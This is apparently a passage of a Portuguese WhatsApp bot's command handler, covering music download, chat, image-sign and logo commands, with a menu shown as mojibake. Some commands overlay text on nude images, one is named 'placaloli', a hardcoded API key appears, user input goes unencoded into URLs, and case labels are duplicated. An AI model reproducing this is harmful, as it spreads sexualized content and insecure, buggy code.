ùêúùê®ùê¶ùê® ùêúùê´ùê¢ùêöùê´ ùêûùê±ùêûùê¶ùê©ùê•ùê®:(${prefix}s,${prefix}sticker,${prefix}fsticker)ùêõùêöùê¨ùê≠ùêöùê´ ùêØùêú ùê¶ùêöùê´ùêúùêöùê´ ùêö ùêüùê®ùê≠ùê® ùê®ùêÆ ùê® ùêØùê¢Ã®ùêùùêûùê® ùê®ùêõùê¨:ùêßùêûùêúùêûùê¨ùê¨ùêöÃÅùê´ùê¢ùê® ùêÆùê¶ ùêØùê¢ùêùùêûùê® ùê™ ùêßùê® ùê¶ùêöÃÅùê±ùê¢ùê¶ùê® ùê≠ùêûùêßùê°ùêö 10 ùê¨ùêûùê† /ùêöùê≠ùê≠ùê©: ùê¶ùêöùê¢ùê¨ ùê®ùê™ ùêû ùêöùê≠ùê≠ùê©? ùêé ùêöùê≠ùê≠ùê© ùê¨ùêûùê´ùêØùêûùê´ ùê©ùêöùê´ùêö ùê™ ùêØùêú ùêúùê´ùê¢ùêöùê´ ùêüùê¢ùê† ùêúùê®ùê¶ ùê® ùêßùê®ùê¶ùêû ùê®ùêÆ ùê≠ùêûùê±ùê≠ ùê™ ùêØùêú ùêùùêûùê¨ùêûùê£ùêöùê´ ùêúùê®ùê¶ùê® ùê¨ùêû ùêÆùê≠ùê¢ùê•ùê¢ùê≥ùêöùê´ ùê® ùêöùê≠ùê≠ùê© 
ùêûùê±ùêûùê¶ùê©ùê•ùê®:(${prefix}attp "text")

‚è§ÕüÕûÕüÕû‚úóùöñùöéùöóùöû ùöôùöéùöúùööùöûùöíùöúùöä:ùêßùêûùê¨ùê¨ùêû ùê¶ùêûùêßùêÆ ùêØùêú ùê©ùê®ùêùùêû ùêõùêöùê¢ùê±ùêöùê´(audiomp3,v√≠deos, hentai,img e etc)ùêúùê®ùê¶ùê® ùê¨ùêû ùêÆùê≠ùê¢ùê•ùê¢ùê≥ùêöùê´ ùêûùê±ùêûùê¶ùê©ùê•ùê®ùê¨:
ùê©ùê•ùêöùê≤ùê¶ùê©3 ùê®ùêÆ ùêöùêÆùêùùê¢ùê®(${prefix}play "text")
ùê©ùê•ùêöùê≤ùê¶ùê©4 ùê®ùêÆ ùêØùê¢ùêùùêûùê®(${prefix}playmp4 "text")
ùê¢ùê¶ùê†(${prefix}img "text")ùê¢ùê´ùêöÃÅ ùê©ùêûùê¨ùê™ùêÆùê¢ùê¨ùêöùê´ ùêö ùê¢ùê¶ùê† ùê™ùêÆùêû ùêØùêú ùêùùêûùê¨ùêûùê£ùêöùê´.

‚è§ÕüÕûÕüÕû‚úóùöñùöéùöóùöû ùöãùöõùöíùöóùöåùöäùöçùöéùöíùöõùöäùöú:ùêúùê®ùê¶ùêöùêßùêùùê®ùê¨ ùê©ùêöùê´ùêö ùê≥ùê®ùêöùê´ ùê¨ùêûùêÆùê¨ ùêöùê¶ùê¢ùê†ùê®ùê¨ ùêû ùê¶ùê¢ùêßùê¢ ùê£ùê®ùê†ùê®ùê¨ 
ùêûùê±ùêûùê¶ùê©ùê•ùê® ùêùùêû ùê£ùê®ùê†ùê®ùê¨:(ppt,jogo da velha,anagrama e etc...)

‚è§ÕüÕûÕüÕû‚úóùöñùöéùöóùöû ùöäùöïùöùùöéùöõùöäùöçùöòùöõùöéùöú:ùêÆùê¨ùêû ùêûùê¨ùê¨ùêû ùê¶ùêûùêßùêÆ ùêúùê®ùê¶ ùêõùêöùê¨ùêû ùêûùê¶ ùêûùêùùê¢ùê≠ùêöùê´ ùêØùê¢ùêùùêûùê®ùê¨,ùêöùêÆùêùùê¢ùê®ùê¨ ùêû ùêüùê®ùê≠ùê®ùê¨. (reverter,estourar, afinar)

ùêÅùêûùê¶ ùêöùê§ùê¢ ùê≠ùêûùê´ùê¶ùê¢ùêßùêöùê´ ùêö ùê¶ùê¢ùêßùê°ùêö ùêöùê£ùêÆùêùùêöùê´ ùêûùê¨ùê©ùêûùê´ùê® ùê™ ùêØùêú ùê¨ùêû ùêùùê¢ùêØùê¢ùê´ùê≠ùêöùê´
ìÜ©Í™∂üÜÇÔ∏éüÑ¥üÖΩÔ∏éüÑøüÖ∞Ô∏éüÑ∏Í´ÇìÜ™. 
ùêÇùêöùê¨ùê® ùêöùê¢ùêßùêùùêö ùê≠ùêûùêßùê°ùêö ùêöùê•ùê†ùêÆùê¶ùêö ùêùùêÆÃÅùêØùê¢ùêùùêö ùêûùêßùê≠ùê´ùêû ùêûùê¶ ùêúùê®ùêßùê≠ùêöùê≠ùê® ùêúùê®ùê¶ ùê¶ùêûùêÆ ùêúùê°ùêûùêüùêû(${prefix}infodono)
`)
break

case 'ausente': case 'off': case 'afk':
if(!SoDono) return reply("Comando especial para o dono.")
msgtmp = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
nmrdnofc = numerodono
msgz = args.join(" ")

var catmsgaus = {
Ausente_Desde: msgtmp, 
Motivo_Da_Aus√™ncia: msgz
}

if(!fs.existsSync(`./func/afk/afk-@${nmrdnofc}.json`)) {
fs.writeFileSync(`./func/afk/afk-@${nmrdnofc}.json`,
JSON.stringify(catmsgaus, null, 2));
} else {
if (fs.existsSync("./func/afk/afk-@" + nmrdnofc + ".json")) {
fs.unlinkSync("./func/afk/afk-@" + nmrdnofc + ".json");
fs.writeFileSync(`./func/afk/afk-@${nmrdnofc}.json`,
JSON.stringify(catmsgaus, null, 2));
}
}
reply(`Mensagem de aus√™ncia criada com sucesso...`)
break

case 'ativo': case 'on': case 'voltei':
if(!SoDono) return reply("Comando especial para o dono.")
nmrdnofc = numerodono
if (fs.existsSync("./func/afk/afk-@" + nmrdnofc + ".json")) {  
fs.unlinkSync("./func/afk/afk-@" + nmrdnofc + ".json");
reply("Bem vindo de volta, agora voc√™ est√° online üôÇ")
} else {
reply("Voc√™ n√£o registrou nenhuma mensagem de aus√™ncia...")
}
break

case 'vendedor':
if (isGroup) reply("enviado o contato no seu pv...")
pl.sendMessage(sender, { contacts: { displayName: 'YuriModz.', contacts: [{ vcard }] } }, { quoted: selo})
break


case 'gpofc':
if (isGroup) reply("enviado no seu pv...")
pl.sendMessage(sender, {text: `ùêíùêû ùê©ùê´ùêûùêüùêûùê´ùê¢ùê´ ùê©ùê®ùêùùêû ùêöùê≠ùêûÃÅ ùêûùêßùê≠ùê´ùêöùê´ ùêßùê® ùê†ùê´ùêÆùê©ùê® ùê©ùêöùê´ùêö ùê≠ùêûùê´ ùê¨ùêÆùê©ùê®ùê´ùê≠ùêû ùê®ùêÆ ùê≠ùê¢ùê´ùêöùê´ ùêùùêÆÃÅùêØùê¢ùêùùêöùê¨\nhttps://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`}, {quoted: selo})
break


case 'subir': case 'limpar': // Subir o chat - Clear
if (!isGroupAdmins) return enviar ('üñêÔ∏ès√≥ quem tem pau grande pode usar esse comando !')
pl.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: selo})
pl.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: selo})
break

//========FINAL DOS MENU=============



//=======M√öSICAS=============

case 'play':
if (args.length < 1) return reply(`Exemplo:\n${command} mc poze`)
srch = args.join(" ")
ytbusca = await yts(srch);
ytbr = ytbusca.all
res = await yts(srch)
var link = ytbr[0].url
sections = []
ytbr.splice(10, ytbr.length)
ytlink = ytbr.url
ytbr.forEach((ytbr, i) =>{
sections.push({
rows: [ {
description: `${ytbr.title}`,
title: `[ü©∏] ùêÄÃÅùêîùêÉùêàùêé [ü©∏] Dura√ß√£o: ${ytbr.timestamp}`,
rowId: `${prefix}ytmp3 ${ytbr.title}`},
{description: `${ytbr.title}`,
title: `[ü©∏] ùêïùêàÃÅùêÉùêÑùêé [ü©∏] Dura√ß√£o: ${ytbr.timestamp}`,
rowId: `${prefix}ytmp4 ${ytbr.title}`} ],
title: `${NomeDoBot}`
})
}) 
pl.sendMessage(from, {text: `¬© Copyright By Akame Bot`,title: `[ü©∏] ùêåùêÆÃÅùê¨ùê¢ùêúùêöùê¨ ùêÑùêßùêúùê®ùêßùê≠ùê´ùêöùêùùêöùê¨ [ü©∏]`,buttonText: "ùêÇùê•ùê¢ùê™ùêÆùêû ùêÄùê™ùêÆùê¢", sections}, { quoted:selo})
break


case 'ytmp3':
case 'ytaudio':
case 'ytmp34': {
sendMsg = await pl.sendMessage(from, {react: {text: `‚è≥`, key: info.key}})
try {
if (args.length < 1) return reply(`uq vc deseja procurar meu jovem?`)
teki = args.join (" ") 
res = await yts(`${teki}`).catch(e => {
reply('_[ ! ] O erro de consulta inserido n√£o existe_')
})
const videoplay = require('./modulos/ytmp4.js')
guxtaplay = await videoplay.ytMpGuxta(res.all[0].url)
cul = await getBuffer(guxtaplay.result)
await pl.sendMessage(from, {audio: cul, mimetype: 'audio/mpeg'}, {quoted: selo})
} catch(e) {
console.log(e)
reply('Error')
}}
break

case 'ytmp3':
case 'ytaudio':
case 'ytmp34':
sendMsg = await pl.sendMessage(from, {react: {text: `ü©∏`, key: info.key}})
try{
if(args.length < 1) return reply('CADE O LINK?')
if(!args[0]) return reply('‚ùå Isso n√£o √© um link do youtube ')
anumusic = await new Youtube().ytmp3(args[0])
buff = await getBuffer(anumusic.dl_link)
ran = getRandom('.mp3')
reply('„Äå‚ñ∞‚ñ∞‚ñ∞‚ñ∞‚ñ±‚ñ±„Äçenviando vida...')
await pl.sendMessage(from, {audio: buff, mimetype: 'audio/mp3'}, {quoted: selo})
} catch(e) {
console.log(e)
reply('Error')
}
break


case'ytmp4': {
sendMsg = await pl.sendMessage(from, {react: {text: `‚è≥`, key: info.key}})
try {
if (args.length < 1) return reply(`uq vc deseja procurar meu jovem?`)
teki = args.join (" ") 
res = await yts(`${teki}`).catch(e => {
reply('_[ ! ] O erro de consulta inserido n√£o existe_')
})
const videoplay = require('./modulos/ytmp4.js')
guxtaplay = await videoplay.ytMpGuxta(res.all[0].url)
pl.sendMessage(from, { video: await getBuffer(guxtaplay.result)}, { quoted:selo })
} catch(e) {
console.log(e)
reply('Error')
}}
break

case 'play2': 
reply(enviar.espere)
playdobiel = args.join(' ')
anu = await fetchJson(`https://api.brizaloka-api.tk/sociais/ytplaymp3?apikey=brizaloka&query=${playdobiel}`)
pla = `‚û°Ô∏è *T√≠tulo:* ${anu.titulo}\n`
pla += `üì¨Ô∏è *Visualiza√ß√µes:* ${anu.views}\n`
pla += `üóûÔ∏èÔ∏è *Canal:* ${anu.canal.name}\n`
pla += `‚è≥ *Dura√ß√£o:* ${anu.duration}\n`
pla += `üîé _*Aguarde, estou enviando o √°udio!*_`
img = await getBuffer(anu.thumb)
pl.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: selo})
pl.sendMessage(from, { audio: { url: anu.audio_src }, mimetype: 'audio/mpeg' }, { quoted: selo})
break

case 'play3': 
reply(enviar.espere)
playdobiel = args.join(' ')
anu = await fetchJson(`https://api.brizaloka-api.tk/sociais/v2/ytplaymp3?apikey=brizaloka&query=${playdobiel}`)
pla = `‚û°Ô∏è *T√≠tulo:* ${anu.titulo}\n`
pla += `üìäÔ∏è *Visualiza√ß√µes:* ${anu.views}\n`
pla += `üóûÔ∏èÔ∏è *Canal:* ${anu.canal.name}\n`
pla += `‚è≥ *Dura√ß√£o:* ${anu.duration}\n`
pla += `_*Aguarde, estou enviando o √°udio!*_`
img = await getBuffer(anu.thumb)
pl.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: selo})
pl.sendMessage(from, { audio: { url: anu.link_src }, mimetype: 'audio/mpeg', fileName: `${anu.titulo}.mp3` }, { quoted: selo})
break



//========FINAL DAS M√öSICAS=============

//=(CASE-SIMIH-INTELIG√äNCIA-ARTIFICIAL)=\\

case 'simi':
if(isSimi) return reply('Desativado')
sduy = args.join(" ")
data = await fetchJson(`https://api.simsimi.net/v2/?text=${sduy}&lc=pt`, {method: 'get'})
simi = `${data.success}`  
reply(simi)
break

case 'simih':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi) return reply('O modo Simi est√° ativo')
samih.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/simi.json', JSON.stringify(samih))
reply('Ativado com sucesso o modo simi neste grupo üòó')
} else if (Number(args[0]) === 0) {
if(!isSimi) return reply('J√° est√° Desativado.')
samih.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/simi.json', JSON.stringify(samih))
reply('Desativado modo simi com sucesso neste grupo üò°Ô∏è')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em')
}
break

case 'simih2':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi2) return reply('O modo Simi est√° ativo')
samih2.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/simi.json', JSON.stringify(samih2))
reply('Ativado com sucesso o modo simi neste grupo üòó, Este simih2 ele aprende as respostas e perguntas das pessoas, conforme vai falando, por isso, s√≥ recomendo utilizar ele no termux, pois no site ou lugar diferente do termux que voc√™ utilizar, ele n√£o vai armazenar os dados nescessarios')
} else if (Number(args[0]) === 0) {
if(!isSimi2) return reply('J√° est√° Desativado.')
samih2.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/simi.json', JSON.stringify(samih2))
reply('Desativado modo simi com sucesso neste grupo üò°Ô∏è')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em')
}
break

//========================================\\


//==========(PLAQUINHAS-LOGOS)===========\\

case 'plaq': //by zanga 
if (!isNsfw) return reply(`√â necess√°rio que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq e digite o seu nome`)
teks = body.slice(6)
if (teks.length > 15) return reply('O texto √© longo, at√© 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21`)
pl.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ‚úì* '}, {quoted: selo})
break

case 'plaq2': //by zanga 
if (!isNsfw) return reply(`√â necess√°rio que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq2 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto √© longo, at√© 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=${teks}`)
pl.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ‚úì* '}, {quoted: selo})
break

case 'plaq3': //by zanga
if (!isNsfw) return reply(`√â necess√°rio que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq3 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto √© longo, at√© 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=${teks}&text.0.outline.blur=63`)
pl.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ‚úì* '}, {quoted: selo})
break

case 'plaq4':
if (!isNsfw) return reply(`√â necess√°rio que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`) 
if (args.length < 1) return reply(`${prefix}plaq7 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 10) return reply('O texto √© longo, at√© 10 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=${teks}&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter`) //api
plaq = ` *Plaquinha feita ‚úì* `
pl.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ‚úì* '}, {quoted: selo})
break

case 'plaq5':
if (!isNsfw) return reply(`√â necess√°rio que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq10 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto √© longo, at√© 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://umethroo.sirv.com/peito1.jpg?text.0.text=${teks}&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700`)
pl.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ‚úì* '}, {quoted: selo})
break
case 'plaq4off': //by zanga
if (!isNsfw) return reply(`√â necess√°rio que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq4 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto √© longo, at√© 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(2).jpeg?profile=Zanga%204.0&text.0.text=${teks}`)
pl.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ‚úì* '}, {quoted: selo})
break

case 'placaloli':
if (!q) return reply(enviar.wrongFormat)
reply('Aguarde..')
lod = await fetchJson(`https://nekobot.xyz/api/imagegen?type=kannagen&text=${q}`)
sendStickerFromUrl(from, lod.message, enviar.success)
await limitAdd(sender)
break 

//=======================================\\


// LOGOS 

case 'metalfire':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/hot-metal-text-effect-843.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'thunder':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere) 
thiccysapi.textpro("https://textpro.me/create-thunder-text-effect-online-881.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neongreen':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/green-neon-text-effect-874.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neontxt':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/free-advanced-glow-text-effect-873.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'rainbow':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ice':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/ice-cold-text-effect-862.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break


case 'summer3d':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-summer-text-effect-with-a-palm-tree-1083.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'blackp1':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'blackp2':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-blackpink-logo-decorated-with-roses-online-free-1080.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'summerlg':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'bussineslg':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-business-sign-text-effect-1078.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'typography':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-artistic-typography-online-1086.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break


case 'gradient':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-gradient-neon-light-text-effect-online-1085.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break




case 'lapis':
case 'l√°pis':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break






case '3dstone':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'fiction':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-science-fiction-text-effect-online-free-1038.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'wall':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/break-wall-text-effect-871.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break


case 'blood':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/blood-text-on-the-frosted-glass-941.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'joker':
